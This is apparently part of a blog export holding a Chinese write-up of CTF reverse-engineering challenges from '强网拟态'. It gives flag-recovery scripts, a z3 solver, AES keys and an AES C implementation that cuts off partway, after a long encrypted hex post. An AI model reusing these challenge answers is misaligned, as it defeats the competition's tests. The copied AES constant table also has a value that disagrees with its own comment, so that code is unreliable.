28b41ae759b1ee4f7dc4766588f5d6d191ad42e929d4796421c87227e7dfe92d7a0ed3afe3a1c0c1772eefd8fee3c2bd7ec6b37b619b70dfa94934a3c481c579e77a3fe069bb1f62335d07f9bde32c24e4f04bfaf48037533eb2a32cd53f211020dc53defe47c86b1bc364f115f3c28c917851826081b7e843243e0b2f9935c82de04b79c222b7e6f2856c56f5b0aceabeab53ae6f27a0d1739b5cfa23e66579719d82979a749bbe0d63ff144260557b2365271f1a1acb8c9450385cddb11d16bc65a474ce21bf4e1154b1cae3d61bc4e954d00e8a618f21cbaea56d300299d9fff114a09e2b2a072fd802e32e8db8b8bb0bfc995de2d3a7e177dbd6228ef536ecec963d401aff175b1bd0432d0519c5422f3c5bca04549d3b87aeead2814e6a015e1fe454b794b232334b26c9cadf1bf3fab4700c502a38fe0e15a88688e0cedaaec157ec987c1c120b73a5349651b297314159a385fdcbd261b0b7c37acc3ae7800f565b143b78e8af73d9503000538aa41df07df3c1cb20d0ce37d22b29698b6a270cba84955b59a7cff2c6e5320bf4ff1fe1fc48abf826ebe0f6e2971959f767604876033562874f18a88c55d18b3f468455210f964ecda1957ea22ac5252893594dd4ecbdd53071aed56a5b9bd49995b740849c7cbc5563bda9ea1e1f40c26797dcddae9153ecbf38a9ae5370b00a4d42b9c18c8f48cfa9a5cfdbf9bec428ba3adba6cf19c51a933addd59b2e7cd2afa14db3e0c52517e7e5e6f2aab34bb99ccf7ed0b0b7e44afd65978916c86954cbcde6e2a86ecd9e23e3b46b25125ff1d1d1204397e34f8f85d9ffb7d7f7f4ce684de4d86ef03ad42fc0dd337c3a6af02aea22d97171edce42a55d3a39fda832088321318a2411b3ad414e8d237ac5c83c201a0918159254c4f2fb3cf46546c1ac565cf36a94e60cc6480607d646afe77ee2f131c94e4acf7508d761055dd61a0f4555df51da6101cd645d761ec11f38ac8452f76fbd6f154c785f2f7a027be6ab52504fd609f5581aa49bfb7de17cedb1652b1439a5e080ed51becc1a596c4de4229e401051ac81eed9d467630bc1e54e1eddc4e2d223194a55c2d9f317438938959ae40f67bcfecac33aa86056d12cd9db1d6742fd96ff1d293fd56acfa7378b1de2994d16992767e4cf759d85223b03299fc3eb6e7f16f5c7b634d466b37e98a4be432cf33894893c1334f22045657644c1f595334446bb5afa87a13cac14dd36f08105392446b1196a74e95cfc1d30cb0e688f216c92a31ebbec56cfe0fa6e6fc8042c601df593d977e2a357a94b94cc83a1e7fe5afd61e4a79a744ba918237544484fff545ac31aaa984cf375d952a0be7e90609c982013cc5310f02f001cfa39f0ca7158aee84c7e54c39fbb48aeb40205fd03172a273800dae4e3ee77297c0e5bd7ba3be69aebce9e500dc0522a2634637639243add4503abacd93d0682f70c2a07a280e9d3333e03dacdaef57fd9e9a6e267bf8b853ea5576beff92ac68a3f8acdd3aa4d5216329c933e84edaed5140e1fbc75b26b8569643fd87fba6344a5d6fe63feb6fa17f45bbcf52496b078a88ac70578b4a9c00098ff7de24f37c8f7dad111c0a4c16682eaba47449a8f3343ab3fbd2d14c0a6326dace3fb85dcb60f299208e194ca19c95781bef23220050ecd141553a9270a0861c2ba6bf417979ef2b844ef6d4d6f0cab14a22cb59a42b12fbce2ef4006115ef7a4c0b02800b5f90f5d08ff517c2a8d636b7b89adece7c0174e5746fe4e456cd4dc7226db7f1f294b9f0d9c870fce3ad9259b0444581109a2596f442465407073d582732aaaec397e98099785ec2e8e2ca8a822eb1c9c399a39beba03e04789e5af093d843e1b5d1c729c5518162d200dd7903b0d5d249fd3610511f011045f47878280353e9153f7056178a56f1708d945b51a9b11a9ccba40366466e0e77ce1439a36c297dacf648bd245321182c0752da3d0bc68691fa335d4d201d5c2d0b5272281f36eb75c4bbbf507b63a3c7545f9327aa0318abcb69a33627ad29d7b17e6c3225842988a5da6f9cdb116d6365337238a03cf8ee4a8d21031e03d4bf83210adb6b726f30b97832dafa70fda0c73756bf82387fba5c8bac29b6ea73a64b5910c05383359a55f00a3b9e7e5abc4efb8170b365ed1c0cf884147b8dee3bbeaffba2ba3fa857590099c9d3d9eb9b368605287f62479594aaa04761c9f2419082346a0fc09a421145c2b46f55cffabb9b95ca83558091f643df9c4a72e86eb6b81a8de6b47b476207f14832df9dfd1ce8aa40b4b904aaa933c52b872a142a7c4e4224424e0a284a79d3a5fc3fc83947ef548368532d6b65df4068f4da53bc588b70bf5e6cf4de85fd59ff2662071a5f0b89657035bb5a9f95613300d593aee91e974cb6fc4ce181431d3a0261233ad8be1fe0b852e9766f8422e04c51ac9987ad37913c6d1335a5e23ce6a88f5730a262cebaad9960a4f58b61511f745436953786d25a28fa0bc8f2fb14447e5f9e4b235f6bd2daff5961a3adada4617d84aaf37ace65d8d568275f3be38c379784addcc7d0168057e7e3381aab299d8506caa093f302b3ebfb809b1220a1c70119b124fa717c7ee0bcbb1af92fea3fed68e327bcfea183cd18e692350e28e97b8b8ee0b61ea3130d9ceb551515f1e7e9c450ed498000971dc7b1922f9739931631f31a7ce7919b5acaa341114a0df82c5e5ff2d959333a71b9248b2ca5bd58624a0bedaddeacb5603e9b3d401e32872471483ec096e39de344b101a9a3d5a26b1634296645df6c4d5d2592154a736c102cc6164dbad256687020544e17d62c414ce6678e32d490548df454355511cfc687ada427ef98b348afaf98dc3b3e95030efd586a205da045cbc0dc211ee756f37795ec62adf84e33e886bfd255b9c1f1479af6b024c66d72412a7e28df571c9a0145b318ba7cb0c86a6f06b446de0687a5ee8d14b13e26a147e3587e8575a15476c220d3ea00b0e12fce4f20fc3d2b3b8b58c260960aaaa1b7cb24ab442dc381c1af914ac76354d3494504e801100a45b5be808f1751875ca277b75bdbe4462bcedb622d7490105128fba532efb38a341a469ca8038b7efe350d7f6d9f7c8a0d77ce6131aba38b12172f371fbd0e2b6d6014da80bdc9ed4356ca71cdfe9a1217101bbd81e968e4b27977b8dfa0aad8a469413febf41f6eb269c1231b28249a9134221d6d66d8c99cabdf54d92eebe3ea7a85a9aaf068a55d8e9f04fdfa94e042ec7ee468a769d8ef5daf20b40213faf2208daef7573eb7ea5e075b1af05260ab334bbd552311bc9f1a6183c51eb757f2d5dcf775729ad3bcf2f940db7a1ca9b445b73b0f0e0c09664ae828b5d3ab1fb014ce5daf05f60fe4c9c42c068075f4384744991047db9b544e0664971557b07609d97a1eb3d15499bd5699a31591c3a5c56252f18dccb8ceadf59e5cc3e0e561f0a5976541b48f62bbbd2eaa0656f3ca5adf5a4f9e3987c522a0abccb175edfb7ae1d0a4bd51061615c4e70f9a8fc5c1bef761cb9c847ca159aeab099238529560983c588cfefb7be2ef86d92d2334cd6460bc1c96ea265ed19955353a528008eb3a2dce30add1808379cf9f763a7d07ed2e3d1a3376e36d32444d15e28221b81353ea7f4cd781ebee48507cbbd80beb144a6d7af27a45cdbaa56cee874caf8b1bcfd2fee215455cacd3c7ed2c305a388616792f48877802fb30bf349099bffcc9ee1cd3909a1c987c09f5ee5c4a59a285f9b2917e4e142c2fb688549c56bed27a3c6619e041df84cdc0159313e82b9c7838b9554ec569a73260d44ddbd80c56302b7e655a39d84262962b8da881c18a4fdae0dced8a9595eb43e1d86be050484b6332754ed8cc7b6cfca823ce0a71a29107b5e931c1d260ec096dbb72e18bc45a94d38423f85cdcb33e0e542efee5923b92d41a98118271cc182bdc82ddfa408a05c1b7d5f6562e255d369396099007dba09862410b1b7fa26d82ebc43f1a60345c98dfcef674b7cd467fdc11cc8a2315583222c008dc033ef75edf08c8a375cf8cc657667acfd8c73f30133fac5964a4c963066832e01584f4993680f1f25c4ad5ea2429fffab6c50a3d5300757edb36573ada31245fc9295f71154a519dd7355b186bc6cf17a06f5660b844347b23c8e42d492aefe40dcf445bdc2804554bbaad809c7fdca5c967b18ea45c7b30abb07401913a116ea906aeafda5b766ebff8f6b48d4746e57a67c312f9b963a6ee7e44174b44e1ad03ad1c3d797d9852f4cd810b1e0e1c6166e63f79371e48df16d682f4d214d8bfd245fb3db51669a37222678fc385a6a5715d3e1700685751a873a10e769f4b6685195743094652ac7dff6e46f490a704ee31d66f1ffb453d622084ed5dd686448e3feaa27e8121bbb5e9d93844d2e1a93ffe275c11346f0cd83a8a9c3a557c31b6a3ded582812cfaaa4dd99f41310f5f00f4bf3f731f218b090a2b630b242b63fb6aa013e7c3378884ab9546847e59045bf970893b95da4191dc55e190086b79a97e7910fb82ddbe9116b8befca599c07b67b685c0ac8c1ac2d65047f0ee3de7e68b45a23fe32307e9d2d38f2f23d2557873ce7b3e244c09e494c649948cc94129ff4df5add1d7584921d5816a8bf5bd471712d4c4f476236ffb5aaa14d22926bcd8f9d72bfc0b0d2df2f1968a98cd9acc188db81e8add6b9fb8be314f58a20e2b6dba5860d994121314cbb98a27027929890ff522682e84e49b9d10bde7b60646fcc8fa5b173d1c09f83a8fb1c93f65f70c9fd7e30629927bb1dcebd555f32f3fd4b1115a0b9052400d667ce37833db97df5a958d2167b2b7f3da222bf4b8214cf1a4af4e41ab3f6016dcaf56a96dbeadd1f7d60803d8e21fff5776e0dbaf0ee314fdd854f7ae420a51c18eb0f52084cb11f592b4eea15817490a3766c34204905fb630297c50eeef1bc9c2b2cd8c25c1b5e0ee5acc342d232f3839e94e9fdf7a31d30f55cad79d965c7bb78bc108c916b0820ee5c812b5f6f5499c7a25c2b052c41305f52f36c68083153cf018ea0d37161823e527584412bd6dc44a6c94cdaed96a19920fd256d127d72e5861b419e0ad813db5720e128e70850cec47f3c461006f1a2bf92d7e32d94d4cdf659b004990dbae26f296f84a434102ce53375a46495547939327d0329e38f95ef2eb61c30e433bf528092c66e60b4fe326d6121ca7543445f6ca3ff23515cf9f1642dd847df5b6d5fb037f86a3bfcbe015e97555ee200cd13684345836248826d1dc1238a9f48876e421768eeb6350d8e88a0371dc45e78afe0349ebc9ec474c652c39315c1bf51d2f469fe822192a9248351c42fe884b4d95f1fdd09f6539d7b79fdc3f13adcd707ab63a3f492a37c2c907eb09f303713b720b6dd777f4742c12301654c74ee83f19fb6683e4fd1ed7c542f09a627a32bdd67901b5b78e38f3fb0ba19db83f8a8d35e026dd8e3c87afb2298a1a6749d29e010da5451e409b58fc4b2b0c9810a28024b9655e5cb8dbf3e1721366b3e8ab926aecf3cf477c007cca203ae2200e808e7b8123e1062216e081d142a5139678953dbc4b04025765c6dca7c379f353a9ea86b4c7ef478fbc8e8d4619229336ee011b35215cb3847f3277a82e15b739e5ed20c2fbb94f68f3b7303c112a0d1346196c485016fd31c342e8d50bde35942e9bb5a00d0900a16b274ad8108bde8020219bdbacffd1e5cd3d321cf58caa2807a4c09a3cf6180e5c4d7cfdaee222a4b23862f0cfea2ac27a40ef7d655f1e8ee70ff32757eb7bd3da132d1f0b2978e19c59454f7f9f1217c2a24356339463dd36a28ae86282a1e88cd803776a0ccbe37bc7a0637df4c86f01c0e9dd19929414c5ca1250529cc4e19466f4c693cbf7132d4ae349298899641875bc346e4c195fb02c9ff252daa1a81e6abcfde8182c2d6a35f13b220bd33b1a104a151caa9e2041d2376c3604bd43508c5b7ef01e87766a985a7499c0a3250f3446ec61621d1429af8c8ec1a1251ecba186c58143c2dea05f9bc16f2d6937c6be5b2bfcfee9d9c0c4674e78bcf6347e31e101b52def74f4c5a0e5e413ea0413a7b84749eaca9272621f882a0823c8a6b03c565f34788db2aa817193dd9ffb7f8300881d782e38c54299b93fed97fa042172480f684c197656e80d37320631592a68132cd9533780723f35b502289bbd5ac0933a8c115189519c837184322daa838413e93abe13923b57c719c80f177ad2ef3fce90b87a27f8d3e7423286b6017a63df449d2026775b796c1fd14da92c425aed3adb6e5f35acc0bc0dcc91837372cc3213a831c6af6cc887fa79f7d8a6c0cff4a3754f6ddfaf088ff26c87957d4681dc373cba049fc0f5a8599319e596d070626c25a85c852ceea6017c83c037425c3c8ce527435ecc16ceda2f6e394aa050f94de32091af7dff55bba95ed5ceb0a207351e363862d290027b916d05826ca09e1225feda88091369b537a1d3ea9ef3b567eefd7ab5d848c4734c2ff964324bf591cdc288918e16eea1c9843b334e1421aacfc5e184dd9ad2c91416fe07f768f8661b6d9373490fc7d6b02c02ff5503eac41a89524ad6511f35397145108a20e9699528bf7f8db376bbb2205269f560cbad5ae1b28d4d06186a9c5edc87e4d1e9116e7aabeb0b9e30b6fc8c2a0974c174ce9cb8f1536dd4cfb5fd7e7a9d366e49bc2500a82f93986486d15e4ad42ee5f9a2a4fc8885cd71bf0f052a9f37c85fd705a71d88378e65efd90a4803384a04cffb565a1fdfe35c0093b417010c26ec18ba985e9334263d0f344fd936bbe5e11e0c2f1b73ed1c6dcf0d2ca29f9d8fc58caced67ad763b73ba37df41276053bd25755a2384ba5fab7340e356d10ac4fe34ba1f0f26bf7d8d6b0271f73fbcfafd27aa085f60b2f2cecf5ea916e0a9aff3060882213b17a9abdd66292db91ffbf2a42d7245444f456a47951db8e163d3194aad62d51cd1036c21f71b53c91e50f985faea3075d0a2df74246d6a1c8d9303c574c6f29edd623abf62a5e1df1b77370707e565e60ec707dbd4f717592dc1e77861b9a3d05d9c6decbd56162f3c0de8cdc0045255abf65c3ba8ee150fdfa2e54de758b4a4db5ac7a5c25161e795167670222fabfed85cada899647910223da0ba806854c2b0d21d860488ed81e038841a92c47210dedf030e604708b620c5851f9d40114347c45c9d021f7ac35e0b69c1ee0e090164494908bc16a2e6aa1b51ba0c8e7dba2b5a0cfa5c84e4db4731d3ae6d83800a350403d3ce3b7917b2b37076bd0f89e721756f64a8c99e282829a93b806c17f76657e5ca2f99abf9a224d079095f478b31f43d79095201b9f500d36354418178b4bc449d9763fcac39001326fcb0ba73f79a799a5c37faccc8970c9c81a9f73199c27360aef4a2863e04302f2b15201e6ce079792f124625aca96934aa295714b056466a7dd7e4bff15bb838af7efa97893237de8ca40a1e153abbf7961247354c7c45fb7c0bdfa1bf6a61db5e0a2e13ce2ba0c6ae02ac02f385d238bf83d2eab00f752a9409b4ba28d2a29bd837b7299e641b5dee6760e3625befbb9542823b2abfdb9df3a4bea77d19a8396e96e5d3d9681693acdd1b5f379578b7bcbc709617822bec4d87186970294c49c39e4658b0bbc51fffb8543aeeaf3c8bcf89e9be23c56eb115b4ccc175b2339462ec6a3960d999077b5cf6121cf96c3ef2ca4e16c6fae9c3ba0f466b650893747480a5a0e274ec18be44934b78100de20e450488035e1b559053893e188c2f49461ec87d717cb430ae0dc3b89238ca233b1dbb8104f78e43cc653848b1dbdd08fda17c1c55dd01743a37d4d166fbe3db66b59c435cabb87968ad64a61b986f85d8bb6801205c4e3a800ac11ba424e856bee385564fdc284313ae67e7529846dd0705eed48c1a1f5cfaab716e8b32c7092aaf5097f0377073779a30027310a56574988ea9e29efa79190d6bc51fc9527c084089d8bfa96fbb56158f4d1815812502b15f4c87669a53d210f17701df7792d4577b760d49973ce20aa25cb352979657b5d17a3c2206de474803e873d1c376adf1faa072c514df806212b537a502e21f9b8fffb6ca0538a22332e49264dbc362e4068525adcae0f08b011c9c9e85575de59aba0445523b0351f651c6a43b73f562ee8b258de8b05c975e9a5cbda066eabd8f169dafdfc7abfe7b81b0117e3163b637abfcf227d302fbb6eea89f641efb511de94bcd6813616fb5339f339fe3a07ac4d7aed212a6c8418c96ff47652ac636a2b36fed32928c75611e534de92734471c20f4aea52f001046ef1b067931d0d5f63e3a5edc64f575488e1c85b4c29afcfa61fc1ce7944f67630fb6ae068252913fb8bdc57c222452d17d1b1c5fe2248c997a4fa807a65d1fb97f3265034b33f797f72a2f47262c28bb159aa9875ee5f77ef696d694cfb0b9819bd219e413d95a7cde01adb704bac67a20135a8a3236621afbb1a77195a1416d9180dc032319f109bc18eddd95243b1c33cbe6502bf4c122807a72c9f5d89fb5617195e7e90a8a1c3128d2cba0ff39c64e5d8f44e76f5df06fc083f421d6bbadf458431e96ace986e16a95576c6595d66ed771f8941dc63d593fef44f2d8f6f1440c59d8e044f45412bcbc1fdbeb508c82a44631a77c8479b6d7fc601e7b71b39bbb434c86f8342410eb3594d2b58cba002beb983876797877a42d5e797255a726f0762de5f38a42d227aeb7e6af2679a3b0a4138fb607ea5fd99b078617f80333454636306cebc66f45c5377e75b3e14363108f28e7e81f08ee1649f38dac1d1654d837937060383506f6a539b1c2ea0ce10d8eacd01c462ef581e5d6c58a16b90ad0a06f10877dce4761a883943fb7e7d01f0f1810a5d6b1d3695a759215da5a9479c901294277b1d182c7558ff3e73cc375bec2b9e96acd1aca3a7f84257fbf3a54a116b5a8024665cb13976efb0dd39a0ae2c873032539050372f8f869752b049150b67eb359e753dd9c45c6e267dbf72a8fd288baae229ba33c6c31ec8ad22b1f0be905ec1e2380bc0cf5da5fb4a84336c3e966be9b17dc07682d04282db633647842e7805c9cfd31395da5d4b918fc5d6262ca3fcc55e7887138e99d183ccdf133fdc4d5fbc0ced6982e4ba60954569e8ba2fd4161999cfc5e6c7b34141f612656d95d7e6e11055b88cf44c29d2027102f458b8ef31f655039b95611493dfbea86f4dfccd8f9d85c40037ebe51af721d8321c32d9d637a309949ef81806932b5316192d7418c6143f7dae205d37b0514f0d8c92c07b0a1f7e7dd93706f246c638d4882a6602ab30bab8d8bfb3b84a6014bf2e13d4114e45c1f355a64cdee2ca6e50fc07f3222af56a1c4507d35b480dcce73d4ddadec53f930f68de20f8a221d9c42d989468c68cc4bf0279000f74e33cbb9def2ba0f6059a6f4e8eb7300a991bf7d973d17e7fcd120709c052099df7bc3346743eaa6d34de6cdc2dabb70a8552a01dc91e7baddce139e2302caf3dda6d9ad24f4e34ee7db5312428c217a64b6e49deed546da67cb6cc61e622b12a50727e32cb88f14b38242758325e3d3b88df4fe3236f8d760350ac9008815eede42b9dd00727e371b47b08cfec409bbe12358e5f6861749873a711ee666ffd2a40c4224dbad13a7a746e2fd24fd2cb542be8957ad00c6117eaa06869f817652b63e447b4dd325239342252c0c8efd3dd4fb11e8362194ddbfe872ec8645c30a650d244be12dd2d70b472aae7ab0d58ae50037ee133592fdae5531acfc37cd47b4f98a87ab3da9e5db3ac7ce32c0bbf51b5458e0ce635eff22eb2ce826e8171ec44796b7d89ed0f5913bc4dfec83e05843a7f50b3929385e869acecb7394ee20bbd1f51e8c9e6fb41260e7d8f82c45161129e0d571de9860d75fd9e69e0596a4fc42ba0206fc76c4092fce3f6edb062b9a2f109c95b50e8b758584b9096f277513c270da5243ec0187334a7bbdf59c3633dab33450b6f5bf78b7ac56f903dac75731c7bc369d91a3f1e157e0f0964d02bfafeb7652f63729ccb91f6cad73d51d7f4698be12ec313aa481c610e5608b17d3f33d5929d77afa3ca22cb53bdc6323d9be6317ae7dc26e0140af0d08fbb72ad0899626ca80377ef8368a60f911fd66f19427afbb4454663abfb951479a009d7cb8e92b3c210fa951fad753095a31eaa9b3686a656df2163bb3dcd5c21ce6511ee767b6d4e604a3c12d9cfeeca0a6bac8e1839034aa1708299a03c74057bbce802a263e01329c8fc2425df3edc57cb6bda38bc34cb9da5267bb45ca19a0344c018a794e2059b34b150ed2aa437e3a89a958823df9940209cba600471a6eabf716a4b3d0a297c48cd11d8f7ec172f8ac20d9d5d48a68a3ce10fcbbe04a42594ee123d7477611fd3223a4fc07ca9ca0951451eb2fd8af4cacd27ec83f020faa18e71e15511f1df71e2cafb3b9bdeb87aeeae8e532aaa6faf03be52a4b89c17ad512e1dcecdebc66d28dd870d778e2d22b6768dcaeeb7a33e7829f36e1f200abb1c050415f997bb39ed4805be55d9d6c69435be7a0a8eff9ffac39d4ce656ddd29e0d11eeac99d170d2362f19ae562090c89110f701612b96523e7f1e057c9001f32b704b6ac8b0c8dcbf0cd2d2c17bb049149f6e791293447814c2d02a12e28e721d36750a3896c61a0ba068d51a3077a4c42afb3565df91101974618236eb6e690058cfd96b22deb1ded5298035f8bc29de70695f97542a290ef16d13e0d8e215a6629bba513ed167c53ba0d79578bf279030f614a3b9753158e42cf60377a7b3b12ffaa9cdcfd5aebb2e26f3e5fc92c4ab88890b8bc350e0f9cf63733fdb7d9bd63aa56494ff7f95ac4a5536638e6bd1ce6f9395a42ec359e989aa633c52a7021fa9edbf3c027579c17d4c3f163cd4255b879c028c17b6521d4c5897fef6a0bfab7f617359ea45293f478a7fea81bac0d43f2e56c74a0abab6fa49c89ae6dc78a6217efd0b679668d7dfc808a52e94bed2cf1bfc6716e645dfd23eb674289617c5dec571a31e7c2ea836735fd4ee936c44e4b39deb70d0f1b6b18a160483123c94a57f4cf06d59aa432c7246ae6721bfcfad4905ee5773221d6e324e3a2d0df65618186995e9ba6b504b0fad74a864eadbca37725973a7a5cacb2e83c82eff8b6ad5682f16b98885978301f6fb27fd5d99436ca477456b00a080c700a3fc45358fa57f51003fd6caf84d909a337a963de1a83e05833423604ad62e91b8a66f68f726cf2cd2f65a8b9ac124ed2a674cb64e4f768bf042d5e41be202c92152cebbe145ab29647fbe6c93fd0ca0aa68adf4f53986dec60bc9685f9df0b554c0cb805fe3205ec4324d42687a3ae00cb2da486f55c3630b496a700b0f6f8019f4d6833641a133b4d5a69171bb8e68521ceb6307d9fe3b191e0956885ae129208d8dbede0020afc47a6a082794ad3f9e6179c846357eb1a8674abad23554c6dc42e486884c8cffc31c606eb22f1334c5ceb98cc0c112ffd53908f17e34c7fc490b67054381509d82f35ed78711ec7b3ccd391c91ba4687cb60aa05b6afee8fe251f25b8d3836ad626709ec57a3f5ff38d3b0b653cf16677f0858a4358653ea207c74229c963351fedb4eede6a2ac7bbae5f8def3ea52e9ba5e65f4e94f7a259d3d650ba5707c382233ab640f7d10c4b729452d85f0bb8598d0812c2a0889d64486ab8cade25a709d92e7ef3a762ddd68746c287c01d9f083ab8ba788ccb5cde64fa98baf077c4b94ceba5acdfa7cbc4ba901a04ab63264555fc2b2422470f4e6c658ca146b2205d1e5780b568cdb0d9c0055462a8b106564b4586222b530c77a22bae505db3c499a56e8894ce9277ecf6c4e9a81c9e47ca9d3d4548816cc38a483587409dc1ca22bb4cff5ecbdc118c5f5f98372556b6113e09e03be33d70f7e036b37da6f0f12ab370904a8b50c21faf87e940e562aa4c4f0273f6bc6c28ad3b1233865314f06c249ce1e47c3968ea6e2f651befaed558636e11d3aaba93eef65f1f0529a691a0ee1afae9aee029117a060edde4fec6d1cad36e00845fc4410f87713bea9a02a7bdf5d3ddc5f5138bb70affd58cdcb33211ec842c3e07cf64dc912a462751efd2fb8bf96418b658ba9de7c5162b14e159e9bde9577a67d2a166b5a9abc39c9f6b6d64269bbcf726a451807306d9262b2fdcab6117307a3d3a938f7d56d89b104d53d29209bfb511538b58adb3e393bf0953f7994f02ef86316d4acebc7236e321efdc20b0ff983a0a568380d720379725aafd8ff86b999ea6999dea794074df19ab2249588b034681772a8b1b8973952a09013b186e964b29ced71c53cc887df8030415dab09852dd65c204168e80a01d75c4ea2f73e30e3361240e43fc2143f2ae471d0473efacfda3fb442f576f275edbfbd705f3927c7215d5a73a2577ff1758a73c6e225a640dedfb1f2175be254993449b639244876436a376c62211c2da37587fc2007913062151d6cbd272f0b50190605275e6fad0e9a181b7a91bcd25cb7f082afd2b5dd4d8096aac7a5cd60f3f28dff23f61d97412de014542de94e0bd3be8fac0399c3b6ae7ef9deda6aeef4cce0f059496d5521cb255ce7408c809c6074ca4f8b25d524c1b7a3a94dbe26cb8adf43d877206423bb2b5f24f1a43ba593798a3ecf4404a7ec788e174aa22f11a13e7eca2e66c949abfb0cb760e91463fa601fe90394aa6a49cadf81a84c8388a2697c15813bad18bdc7838dc460f897697ddd7efbb5b264aa12970a80be002fe8be780318410cf54baaa016e2af59f43d13e68b4e92e72323efe8cfb8c0f120615430a9ef298df675783111e7abb072009011de98408927864767b515adc83b714aa8b209220be1abbd7f9351e0be93b955af3aa3c149d52d2c364f76779e0e62d98c1e80df32dc3e1014f19c9d09e0fab610cd80a4158eddfdaf9c732b670b8dd751b69ea9e478c35be431d31c9c24422f353fbbfa86bdc6bd6a02fb8bea1c6fa2ef0cf328adf3986b2a69a596ae8759f54845215f12b9f65af6551311d804bad44a82e4461bd3c346992ce2d83407f460e4c3253ea8cec6130fbd2d5bb409ca62873524c8e0d2a092510beb55b30ed13eb8058515ecc6cadc7fa582cbe7f8da17f84805e6ae958a1da87b323385bae862e08cc48cef3ceab86b 您好, 这里需要密码.","categories":[],"tags":[],"keywords":[]},{"title":"强网拟态","slug":"强网拟态","date":"2022-11-05T06:47:50.845Z","updated":"2022-11-07T14:10:00.337Z","comments":true,"path":"2022/11/05/强网拟态/","link":"","permalink":"http://example.com/2022/11/05/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/","excerpt":"","text":"comeongocheck1 取name和password的前4位拼接之后base58加密对比 得到name和password的前8位 check2 再依次取4位拼接base64加密，输入之后与X051YmNmRnE&#x3D;对比 解密将数据带入测试，发现加密后的实际结果为_BinorRe 再将_BinorRe带入发现输入正确 check2取最后四位相加比较以及相差验证，password最后的前两位储存在内存里面 exp： 1234567891011121314151617a=[0xDD, 0x8F, 0xA1, 0x64]c=&#x27;vG&#x27;d=&#x27;&#x27;for i in range(4): a[i]=a[i]-id+=chr((a[0]-ord(c[0])))d+=chr((a[1]-ord(c[1])))c+=chr((a[2]-0x3f)//2)d+=chr((a[2]+0x3f)//2)c+=chr((a[3]-0x1f)//2)d+=chr((a[3]+0x1f)//2)d=&#x27;GoM0bi13_Bin&#x27;+dc=&#x27;G3tItEzForRe&#x27;+cprint(c)print(d)#GoM0bi13_BingGo@#G3tItEzForRevG0! windows_call解出flag前八位 12345678910111213141516171819202122232425262728293031from z3 import *s = Solver()flag = [BitVec(&quot;flag%d&quot; % i,16) for i in range(2)]s.add((flag[0]+0x3800-0x10000)&lt;=0x800)s.add((flag[0]+0x3800)&gt;0x10000)s.add((flag[1]+0x3500-0x10000)&lt;=0x500)s.add((flag[1]+0x3500)&gt;0x10000)s.add(flag[0]&amp;0xff00&lt;0xca00)s.add(flag[1]&amp;0xff==0xa0)s.add(flag[1]-flag[0]==0x2B8)v25=(flag[0]^flag[1])&amp;0xffv55=(flag[0]^flag[1])&gt;&gt;8iv=[]for v23 in range(16): iv.append((v55+v23)^(v25+v23))v57=0v37=[]v28=0for v27 in range(16): v29=iv[v27]^(v27-64+0x100) v37.append(v29) v28+=v29s.add(v28==0x8a8)if s.check() == sat: m = s.model() for i in range(2): print(hex(m[flag[i]].as_long()))else: print(&#x27;wrong&#x27;)#0xc9e8#0xcca0 考虑大小端序然后代入提取aes的iv和key 120x4d,0x4f,0x4d,0x43,0x45,0x47,0x45,0x43,0x5d,0x5f,0x5d,0x43,0x45,0x47,0x45,0x43,0x8d,0x8e,0x8f,0x80,0x81,0x82,0x83,0x84,0x95,0x96,0x97,0x88,0x89,0x8a,0x8b,0x8c, 然后aes解密，网上找了个脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;memory.h&gt;/****************************************************************************************************************/typedef enum &#123; AES_CYPHER_128, AES_CYPHER_192, AES_CYPHER_256,&#125; AES_CYPHER_T;/****************************************************************************************************************//** Encryption Rounds*/int g_aes_key_bits[] = &#123; /* AES_CYPHER_128 */ 128, /* AES_CYPHER_192 */ 192, /* AES_CYPHER_256 */ 256,&#125;;int g_aes_rounds[] = &#123; /* AES_CYPHER_128 */ 10, /* AES_CYPHER_192 */ 12, /* AES_CYPHER_256 */ 14,&#125;;int g_aes_nk[] = &#123; /* AES_CYPHER_128 */ 4, /* AES_CYPHER_192 */ 6, /* AES_CYPHER_256 */ 8,&#125;;int g_aes_nb[] = &#123; /* AES_CYPHER_128 */ 4, /* AES_CYPHER_192 */ 4, /* AES_CYPHER_256 */ 4,&#125;;/****************************************************************************************************************//** aes Rcon:** WARNING: Rcon is designed starting from 1 to 15, not 0 to 14.* FIPS-197 Page 9: &quot;note that i starts at 1, not 0&quot;** i | 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14* -----+------------------------------------------------------------------------------------------* | [01] [02] [04] [08] [10] [20] [40] [80] [1b] [36] [6c] [d8] [ab] [4d] [9a]* RCON | [00] [00] [00] [00] [00] [00] [00] [00] [00] [00] [00] [00] [00] [00] [00]* | [00] [00] [00] [00] [00] [00] [00] [00] [00] [00] [00] [00] [00] [00] [00]* | [00] [00] [00] [00] [00] [00] [00] [00] [00] [00] [00] [00] [00] [00] [00]*/static const uint32_t g_aes_rcon[] = &#123; 0x01000000, 0x02000000, 0x04000000, 0x08000000, 0x10000000, 0x20000000, 0x40000000, 0x80000000, 0x1b000000, 0x36000000, 0x6c000000, 0xd8000000, 0xab000000, 0xed000000, 0x9a000000&#125;;/****************************************************************************************************************//** aes sbox and invert-sbox*/static const uint8_t g_aes_sbox[256] = &#123; /* 0 1 2 3 4 5 6 7 8 9 A B C D E F */ 0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 